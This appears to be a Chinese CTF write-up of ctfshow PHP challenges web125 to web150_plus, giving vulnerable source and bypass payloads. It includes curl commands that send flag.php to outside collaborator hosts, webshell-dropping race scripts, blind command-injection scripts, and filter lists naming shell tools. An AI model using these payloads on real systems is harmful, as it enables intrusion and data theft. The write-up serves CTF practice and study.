&#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; 原题：https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math web125123456789101112131415&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125;?&gt; 对输出进行过滤了 才看清不是对长度进行过滤的 草 这题 直接include payload: 123?1=php://filter/convert.base64-encode/resource=flag.phpPOST: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=include($_GET[1]) web1261234567891011121314&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125; $a[0]既然是$_SERVER[&#39;QUERY_STRING&#39;] 我们直接eval或者assert payload: 123?$fl0g&#x3D;flag_give_me;POST : CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0]) 或者 123?$fl0g&#x3D;flag_give_mePOST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;assert($a[0]) 还有种解法 先看下 发现通过+我们分割成了多个变量 配和parse_str函数就可以变量覆盖 注意下标 payload: 123?a&#x3D;a+b&#x3D;b+fl0g&#x3D;flag_give_mePOST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;parse_str($a[2]) web127123456789101112131415161718192021222324252627&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show = md5($flag);$url = $_SERVER[&#x27;QUERY_STRING&#x27;];//特殊字符检测function waf($url)&#123; if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123; return true; &#125;else&#123; return false; &#125;&#125;if(waf($url))&#123; die(&quot;嗯哼？&quot;);&#125;else&#123; extract($_GET);&#125;if($ctf_show===&#x27;ilove36d&#x27;)&#123; echo $flag;&#125; $_SERVER[&#39;QUERY_STRING&#39;]不会进行url解码 编码就行 payload: 1?ctf%5fshow&#x3D;ilove36d web1281234567891011121314151617&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$f1 = $_GET[&#x27;f1&#x27;];$f2 = $_GET[&#x27;f2&#x27;];if(check($f1))&#123; var_dump(call_user_func(call_user_func($f1,$f2)));&#125;else&#123; echo &quot;嗯哼？&quot;;&#125;function check($str)&#123; return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);&#125; 考察的是gettext扩展 开启之后_() 等效于 gettext() 再通过get_defined_vars函数定义变量就行 payload: 1?f1&#x3D;_&amp;f2&#x3D;get_defined_vars web129123456789&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;f&#x27;]))&#123; $f = $_GET[&#x27;f&#x27;]; if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123; echo readfile($f); &#125;&#125; payload: 1?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;flag.php web1301234567891011121314151617&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123; $f = $_POST[&#x27;f&#x27;]; if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123; die(&#x27;bye!&#x27;); &#125; if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123; die(&#x27;bye!!&#x27;); &#125; echo $flag;&#125; php正则回溯绕过 参考：https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html 回溯次数上限默认是100万 写脚本： 1234567import requestsburp0_url = &quot;http://d7d7ae4b-e1b3-42c4-8ed7-3f04c597e859.chall.ctf.show:80/&quot;burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Origin&quot;: &quot;http://d7d7ae4b-e1b3-42c4-8ed7-3f04c597e859.chall.ctf.show&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: &quot;http://d7d7ae4b-e1b3-42c4-8ed7-3f04c597e859.chall.ctf.show/&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;burp0_data = &#123;&quot;f&quot;: &#x27;a&#x27;*1000000+&quot;ctfshow&quot;&#125;r=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)print(r.text) .+?表示匹配一次 直接绕正则 payload： 1f&#x3D;ctfshow web1311234567891011121314151617&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123; $f = (String)$_POST[&#x27;f&#x27;]; if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123; die(&#x27;bye!&#x27;); &#125; if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123; die(&#x27;bye!!&#x27;); &#125; echo $flag;&#125; 正则回溯绕过 1234567import requestsburp0_url = &quot;http://c792b206-5f52-4336-bca1-2b8f6608c43e.chall.ctf.show/&quot;burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Origin&quot;: &quot;http://d7d7ae4b-e1b3-42c4-8ed7-3f04c597e859.chall.ctf.show&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: &quot;http://d7d7ae4b-e1b3-42c4-8ed7-3f04c597e859.chall.ctf.show/&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;burp0_data = &#123;&quot;f&quot;: &#x27;a&#x27;*1000000+&quot;36Dctfshow&quot;&#125;r=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)print(r.text) web132robots.txt得到/admin 访问 123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123; $username = (String)$_GET[&#x27;username&#x27;]; $password = (String)$_GET[&#x27;password&#x27;]; $code = (String)$_GET[&#x27;code&#x27;]; if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123; if($code == &#x27;admin&#x27;)&#123; echo $flag; &#125; &#125;&#125; php算术优先级： &amp;&amp;的优先级比||高 先算&amp;&amp; payload: 1admin&#x2F;?username&#x3D;admin&amp;code&#x3D;admin&amp;password web1331234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123; if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;6个字母都还不够呀?!&quot;); &#125;&#125; 只是截取了 不是计算长度 注意要加个空格 尝试payload: 1?F&#x3D;&#96;$F&#96;; sleep 3 直接dnslog带出数据 1?F=`$F`; curl $(cat flag.php).fwzero.dnslog.cn 或者利用curl文件上传的方式带出整个文件也行 1?F=`$F`; curl -X POST -F aaa=@flag.php 3aetm28s8fdwcg23v223hh3twk2aqz.burpcollaborator.net web134123456789101112&lt;?phphighlight_file(__FILE__);$key1 = 0;$key2 = 0;if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123; die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);extract($_POST);if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123; die(file_get_contents(&#x27;flag.php&#x27;));&#125; 两处变量覆盖 在第一处修改$_POST 第二处再进行覆盖 payload: 1?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d web1351234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123; if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;); &#125;&#125; payload: 1?F=`$F`; cu\\rl -X POST -F aaa=@flag.php jre12uzktc39k8e61ql8i5w0jrpid7.burpcollaborator.net web13612345678910111213141516 &lt;?phperror_reporting(0);function check($x)&#123; if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; check($c); exec($c);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 过滤了. 使用tee命令输出文件 4需要试 1?c=cat /`ls / | awk &#x27;NR==4&#x27;` | tee test 先列文件 1?c&#x3D;ls &#x2F; | tee test 查看文件 1?c&#x3D;cat &#x2F;f149_15_h3r3 | tee test web1371234567891011121314&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); payload: 12POST: ctfshow&#x3D;ctfshow::getFlag web138123456789101112131415161718&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125;&#125;if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123; die(&quot;private function&quot;);&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); payload: 12POST: ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag web13912345678910111213141516 &lt;?phperror_reporting(0);function check($x)&#123; if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; check($c); exec($c);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 限制了目录的写入权限 时间盲注 exp: 12345678910111213141516171819202122232425import requestsimport stringproxies = &#123; &#x27;http&#x27;:&#x27;127.0.0.1:8080&#x27;&#125;s = string.ascii_letters+string.digits+&#x27;_-=+~&#123;&#125;&#x27;flag = &#x27;&#x27;for i in range(6,50): f = flag for j in s: print(i,j) # payload=&quot;if [ `ls /|awk &#x27;NR==4&#x27;|cut -c &#123;&#125;` == &#x27;&#123;&#125;&#x27; ];then sleep 3;fi&quot;.format(i,j) # payload=&quot;if [ `ls /|ba\\se64 -w0|cut -c &#123;&#125;` == &#x27;&#123;&#125;&#x27; ];then sleep 3;fi&quot;.format(i,j) payload=&quot;if [ `cat /f149_15_h3r3|cut -c &#123;&#125;` == &#x27;&#123;&#125;&#x27; ];then sleep 3;fi&quot;.format(i,j) url=&quot;http://6a4fcccd-a392-48f2-9047-ff9f6bd2fdba.chall.ctf.show/?c=&quot;+payload try: requests.get(url,timeout=3) except requests.exceptions.ReadTimeout as e: flag=flag+j print(flag) break if f==flag: breakprint(flag) 注意这里大括号过滤了 从0开始跑第五个会断 web140123456789101112131415&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123; $f1 = (String)$_POST[&#x27;f1&#x27;]; $f2 = (String)$_POST[&#x27;f2&#x27;]; if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123; if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123; $code = eval(&quot;return $f1($f2());&quot;); if(intval($code) == &#x27;ctfshow&#x27;)&#123; echo file_get_contents(&quot;flag.php&quot;); &#125; &#125; &#125;&#125; 找个没返回值的函数就行 或者返回值为flase 0的 payload: 12POST: f1&#x3D;usleep&amp;f2&#x3D;usleep web1411234567891011121314&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 无字母数字 payload: 1?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;-(~&#39;%8C%86%8C%8B%9A%92&#39;)(~&#39;%93%8C&#39;)- 相当于 1return 0-(&#x27;system&#x27;)(&#x27;ls&#x27;)-0; web1421234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; if(is_numeric($v1))&#123; $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); sleep($d); echo file_get_contents(&quot;flag.php&quot;); &#125;&#125; payload: 1?v1&#x3D;0 web14312345678910111213141516&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 用异或构造 不加单引号也可以： 12?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;*(&#39;%FF%FF%FF%FF%FF%FF&#39;^&#39;%8C%86%8C%8B%9A%92&#39;)(&#39;%FF%FF%FF%FF%FF&#39;^&#39;%9C%9E%8B%DF%D5&#39;)*?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;*(%FF%FF%FF%FF%FF%FF^%8C%86%8C%8B%9A%92)(%FF%FF%FF%FF%FF^%9C%9E%8B%DF%D5)* web144123456789101112131415161718&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; check($v3))&#123; if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125;function check($str)&#123; return strlen($str)===1?true:false;&#125; payload: 1?v1&#x3D;0&amp;v3&#x3D;-&amp;v2&#x3D;(~&#39;%8C%86%8C%8B%9A%92&#39;)(~&#39;%9C%9E%8B%DF%D5&#39;) web14512345678910111213141516&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 三目运算符 payload: 1?v1&#x3D;1&amp;v2&#x3D;0&amp;v3&#x3D;?(~&#39;%8C%86%8C%8B%9A%92&#39;)(~&#39;%9C%9E%8B%DF%D5&#39;): web14612345678910111213141516&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 或运算 payload: 1?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;|(~&#39;%8C%86%8C%8B%9A%92&#39;)(~&#39;%9C%9E%8B%DF%D5&#39;)| web14712345678910&lt;?phphighlight_file(__FILE__);if(isset($_POST[&#x27;ctf&#x27;]))&#123; $ctfshow = $_POST[&#x27;ctf&#x27;]; if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123; $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]); &#125;&#125; 多了个D修饰符：https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php 可以使用换行 payload: 123?show&#x3D;return a;&#125;eval($_POST[1]);&#x2F;&#x2F;POST: ctf&#x3D;\\create_function&amp;1&#x3D;system(&#39;cat *&#39;); \\是php的默认命名空间 利用create_function代码注入rce web14812345678910111213141516&lt;?phpinclude &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(preg_match(&quot;/[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/&quot;,$code))&#123; die(&quot;error&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;function get_ctfshow_fl0g()&#123; echo file_get_contents(&quot;flag.php&quot;);&#125; 异或 payload: 1?code&#x3D;(%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF^%98%9A%8B%A0%9C%8B%99%8C%97%90%88%A0%99%93%CF%98)(); web1491234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125;&#125;file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125;&#125; 直接写index.php 123?ctf&#x3D;index.phpPOST: show&#x3D;&lt;?php system(&#39;cat &#x2F;*&#39;);?&gt; web150123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123; private $username; private $password; private $vip; private $secret; function __construct()&#123; $this-&gt;vip = 0; $this-&gt;secret = $flag; &#125; function __destruct()&#123; echo $this-&gt;secret; &#125; public function isVIP()&#123; return $this-&gt;vip?TRUE:FALSE; &#125; &#125; function __autoload($class)&#123; if(isset($class))&#123; $class(); &#125;&#125;#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123; die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123; echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123; include($ctf);&#125; 任意文件包含 包含session getshell exp: 12345678910111213141516171819202122232425262728293031import requestsimport threadingurl=&#x27;http://fe22169f-4f4c-47aa-9a9c-b563e6c3d773.chall.ctf.show/&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=mb&#x27;&#125;def POST(): files=&#123; &quot;upload&quot;:&#x27;&#x27; #上传无效的空文件 &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27; #恶意进度信息，readfile将直接输出文件内容 &#125; r.post(url,files=files,headers=headers,data=data)def READ(): while True: POST() data = &#123; &#x27;ctf&#x27;:&#x27;/tmp/sess_mb&#x27; &#125; t=r.post(url+&#x27;?isVIP=1&#x27;,data) if &#x27;moonback&#x27; in t.text: print(&#x27;[+] ok&#x27;) else: continuefor i in range(50): threading.Thread(target=READ,args=()).start() web150_plus123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123; private $username; private $password; private $vip; private $secret; function __construct()&#123; $this-&gt;vip = 0; $this-&gt;secret = $flag; &#125; function __destruct()&#123; echo $this-&gt;secret; &#125; public function isVIP()&#123; return $this-&gt;vip?TRUE:FALSE; &#125; &#125; function __autoload($class)&#123; if(isset($class))&#123; $class(); &#125;&#125;#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123; die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123; echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123; include($ctf);&#125; 这个用session 上传进度同样可以 不过预期解是利用phpinfo lfi 注意这个__autoload函数不是在类里面的 太坑了 上面那个也不是 当class_exists传入参数为当前未定义类的情况下 就会触发__autoload方法进行自动加载 这样就可以触发phpinfo exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275#!/usr/bin/pythonimport sysimport threadingimport socketattempts_counter = 0def setup(host, port, phpinfo_path, lfi_path, lfi_param, shell_code=&#x27;&lt;?php eval($_POST[&quot;mb&quot;]);?&gt;&#x27;, shell_path=&#x27;/tmp/g&#x27;): &quot;&quot;&quot; 根据提供参数返回请求内容 :param host:HOST :param port:端口 :param phpinfo_path: phpinfo文件地址 :param lfi_path: 包含lfi的文件地址 :param lfi_param: lfi载入文件时, 指定文件名的参数 :param shell_code: shell代码 :param shell_path: shell代码保存位置 :return: phpinfo_request: phpinfo 请求内容 lfi_request: lfi 请求内容 tag: 标识内容 &quot;&quot;&quot; tag = &#x27;Security Test&#x27; # 搜索验证标识 payload = \\&#x27;&#x27;&#x27;&#123;tag&#125;\\r&lt;?php $c=fopen(&#x27;&#123;shell_path&#125;&#x27;,&#x27;w&#x27;);fwrite($c,&#x27;&#123;shell_code&#125;&#x27;);?&gt;\\r&#x27;&#x27;&#x27;.format(shell_code=shell_code, tag=tag, shell_path=shell_path) request_data = \\&#x27;&#x27;&#x27;-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\\rContent-Type: text/plain\\r\\r&#123;payload&#125;-----------------------------7dbff1ded0714--\\r&#x27;&#x27;&#x27; .format(payload=payload) phpinfo_request = \\&#x27;&#x27;&#x27;POST &#123;phpinfo_path&#125;?%5f%5fCTFSHOW%5f%5f=phpinfo&amp;a=&#123;padding&#125; HTTP/1.1\\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#123;padding&#125;\\rHTTP_ACCEPT: &#123;padding&#125;\\rHTTP_USER_AGENT: &#123;padding&#125;\\rHTTP_ACCEPT_LANGUAGE: &#123;padding&#125;\\rHTTP_PRAGMA: 